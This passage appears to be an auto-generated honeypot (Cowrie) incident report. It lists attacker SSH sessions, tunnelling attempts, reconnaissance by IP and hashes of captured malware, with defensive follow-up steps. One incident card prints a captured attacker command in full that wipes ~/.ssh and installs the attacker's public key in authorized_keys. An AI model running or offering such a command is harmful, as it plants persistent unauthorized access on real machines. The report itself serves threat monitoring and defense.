- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc15b2ee1426

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-22 18:27 |
| **Last Seen** | 2026-08-22 18:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:27:15` | `cowrie.session.connect` |
| `2026-08-22 18:27:16` | `cowrie.client.version` |
| `2026-08-22 18:27:16` | `cowrie.client.kex` |
| `2026-08-22 18:27:17` | `cowrie.login.success` |
| `2026-08-22 18:27:17` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102cf42ce408

| Field | Detail |
|---|---|
| **Source IP** | `91.92.209[.]22` |
| **First Seen** | 2026-08-22 18:27 |
| **Last Seen** | 2026-08-22 18:27 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:27:21` | `cowrie.session.connect` |
| `2026-08-22 18:27:23` | `cowrie.client.version` |
| `2026-08-22 18:27:23` | `cowrie.client.kex` |
| `2026-08-22 18:27:27` | `cowrie.login.success` |
| `2026-08-22 18:27:28` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.209[.]22` to AbuseIPDB if not already reported
- [ ] Block `91.92.209[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-283648a07e00

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:29 |
| **Last Seen** | 2026-08-22 18:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:29:29` | `cowrie.session.connect` |
| `2026-08-22 18:29:29` | `cowrie.client.version` |
| `2026-08-22 18:29:29` | `cowrie.client.kex` |
| `2026-08-22 18:29:31` | `cowrie.login.success` |
| `2026-08-22 18:29:31` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:29:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:29:31` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53e16f332b9c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:30 |
| **Last Seen** | 2026-08-22 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:30:01` | `cowrie.session.connect` |
| `2026-08-22 18:30:01` | `cowrie.client.version` |
| `2026-08-22 18:30:01` | `cowrie.client.kex` |
| `2026-08-22 18:30:02` | `cowrie.login.success` |
| `2026-08-22 18:30:02` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:30:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:30:02` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45bea2e00658

| Field | Detail |
|---|---|
| **Source IP** | `156.225.1[.]89` |
| **First Seen** | 2026-08-22 18:33 |
| **Last Seen** | 2026-08-22 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:33:18` | `cowrie.session.connect` |
| `2026-08-22 18:33:18` | `cowrie.login.success` |
| `2026-08-22 18:33:19` | `cowrie.session.params` |
| `2026-08-22 18:33:19` | `cowrie.command.input` |
| `2026-08-22 18:33:19` | `cowrie.command.failed` |
| `2026-08-22 18:33:19` | `cowrie.command.input` |
| `2026-08-22 18:33:19` | `cowrie.log.closed` |
| `2026-08-22 18:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.1[.]89` to AbuseIPDB if not already reported
- [ ] Block `156.225.1[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755646d19232

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:39 |
| **Last Seen** | 2026-08-22 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:39:25` | `cowrie.session.connect` |
| `2026-08-22 18:39:25` | `cowrie.client.version` |
| `2026-08-22 18:39:25` | `cowrie.client.kex` |
| `2026-08-22 18:39:26` | `cowrie.login.success` |
| `2026-08-22 18:39:26` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:39:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:39:27` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a8c6156f03

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:39 |
| **Last Seen** | 2026-08-22 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:39:52` | `cowrie.session.connect` |
| `2026-08-22 18:39:52` | `cowrie.client.version` |
| `2026-08-22 18:39:52` | `cowrie.client.kex` |
| `2026-08-22 18:39:53` | `cowrie.login.success` |
| `2026-08-22 18:39:53` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:39:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:39:54` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9ca2f499ec

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-08-22 18:41 |
| **Last Seen** | 2026-08-22 18:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:41:39` | `cowrie.session.connect` |
| `2026-08-22 18:41:39` | `cowrie.client.version` |
| `2026-08-22 18:41:39` | `cowrie.client.kex` |
| `2026-08-22 18:41:41` | `cowrie.login.success` |
| `2026-08-22 18:41:41` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f86d523d090c

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-08-22 18:41 |
| **Last Seen** | 2026-08-22 18:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:41:47` | `cowrie.session.connect` |
| `2026-08-22 18:41:47` | `cowrie.client.version` |
| `2026-08-22 18:41:47` | `cowrie.client.kex` |
| `2026-08-22 18:41:50` | `cowrie.login.success` |
| `2026-08-22 18:41:50` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47dedf0b2d50

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-22 18:43 |
| **Last Seen** | 2026-08-22 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:43:29` | `cowrie.session.connect` |
| `2026-08-22 18:43:29` | `cowrie.client.version` |
| `2026-08-22 18:43:29` | `cowrie.client.kex` |
| `2026-08-22 18:43:29` | `cowrie.login.success` |
| `2026-08-22 18:43:29` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:43:29` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333dc9fe5abc

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-08-22 18:46 |
| **Last Seen** | 2026-08-22 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:46:53` | `cowrie.session.connect` |
| `2026-08-22 18:46:53` | `cowrie.client.version` |
| `2026-08-22 18:46:53` | `cowrie.client.kex` |
| `2026-08-22 18:46:53` | `cowrie.login.success` |
| `2026-08-22 18:46:54` | `cowrie.session.params` |
| `2026-08-22 18:46:54` | `cowrie.command.input` |
| `2026-08-22 18:46:54` | `cowrie.command.failed` |
| `2026-08-22 18:46:54` | `cowrie.log.closed` |
| `2026-08-22 18:46:55` | `cowrie.session.params` |
| `2026-08-22 18:46:55` | `cowrie.command.input` |
| `2026-08-22 18:46:55` | `cowrie.session.file_download` |
| `2026-08-22 18:46:55` | `cowrie.log.closed` |
| `2026-08-22 18:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ac464d4662

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-08-22 18:46 |
| **Last Seen** | 2026-08-22 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:46:55` | `cowrie.session.connect` |
| `2026-08-22 18:46:55` | `cowrie.client.version` |
| `2026-08-22 18:46:55` | `cowrie.client.kex` |
| `2026-08-22 18:46:56` | `cowrie.login.success` |
| `2026-08-22 18:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1edc63775af3

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-08-22 18:46 |
| **Last Seen** | 2026-08-22 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:46:56` | `cowrie.session.connect` |
| `2026-08-22 18:46:56` | `cowrie.client.version` |
| `2026-08-22 18:46:56` | `cowrie.client.kex` |
| `2026-08-22 18:46:56` | `cowrie.login.success` |
| `2026-08-22 18:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21053068b4c

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-08-22 18:49 |
| **Last Seen** | 2026-08-22 18:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:49:08` | `cowrie.session.connect` |
| `2026-08-22 18:49:09` | `cowrie.client.version` |
| `2026-08-22 18:49:09` | `cowrie.client.kex` |
| `2026-08-22 18:49:11` | `cowrie.login.success` |
| `2026-08-22 18:49:11` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc4414f3e27

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:49 |
| **Last Seen** | 2026-08-22 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:49:13` | `cowrie.session.connect` |
| `2026-08-22 18:49:13` | `cowrie.client.version` |
| `2026-08-22 18:49:14` | `cowrie.client.kex` |
| `2026-08-22 18:49:14` | `cowrie.login.success` |
| `2026-08-22 18:49:15` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:49:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:49:15` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df3acc5e0e6

| Field | Detail |
|---|---|
| **Source IP** | `124.133.10[.]66` |
| **First Seen** | 2026-08-22 18:49 |
| **Last Seen** | 2026-08-22 18:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:49:17` | `cowrie.session.connect` |
| `2026-08-22 18:49:18` | `cowrie.client.version` |
| `2026-08-22 18:49:18` | `cowrie.client.kex` |
| `2026-08-22 18:49:19` | `cowrie.login.success` |
| `2026-08-22 18:49:20` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.133.10[.]66` to AbuseIPDB if not already reported
- [ ] Block `124.133.10[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e769b1f3480

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:49 |
| **Last Seen** | 2026-08-22 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:49:49` | `cowrie.session.connect` |
| `2026-08-22 18:49:49` | `cowrie.client.version` |
| `2026-08-22 18:49:49` | `cowrie.client.kex` |
| `2026-08-22 18:49:50` | `cowrie.login.success` |
| `2026-08-22 18:49:50` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:49:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:49:50` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `156.225.1[.]89` | **8** | 2026-08-22 18:32 | 2026-08-22 18:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-22 17:13 | 2026-08-22 18:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.99.6[.]133` | **3** | 2026-08-22 17:15 | 2026-08-22 17:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.21[.]151` | **2** | 2026-08-22 17:21 | 2026-08-22 17:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | **2** | 2026-08-22 17:30 | 2026-08-22 17:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-22 18:29 | 2026-08-22 18:43 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.255.200[.]90` | 1 | 2026-08-22 17:07 | 2026-08-22 17:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `104.238.110[.]208` | 1 | 2026-08-22 17:11 | 2026-08-22 17:12 | 38s | 0 | `T1592` | 🟢 LOW |
| `14.103.50[.]128` | 1 | 2026-08-22 17:15 | 2026-08-22 17:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.255.14[.]32` | 1 | 2026-08-22 18:28 | 2026-08-22 18:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-08-22 18:18 | 2026-08-22 18:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `200.69.35[.]17` | 1 | 2026-08-22 17:49 | 2026-08-22 17:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `223.241.214[.]127` | 1 | 2026-08-22 18:20 | 2026-08-22 18:20 | 14s | 0 | `T1592` | 🟢 LOW |
| `31.173.29[.]136` | 1 | 2026-08-22 18:17 | 2026-08-22 18:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.223.116[.]111` | 1 | 2026-08-22 18:26 | 2026-08-22 18:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-08-22 17:54 | 2026-08-22 17:56 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
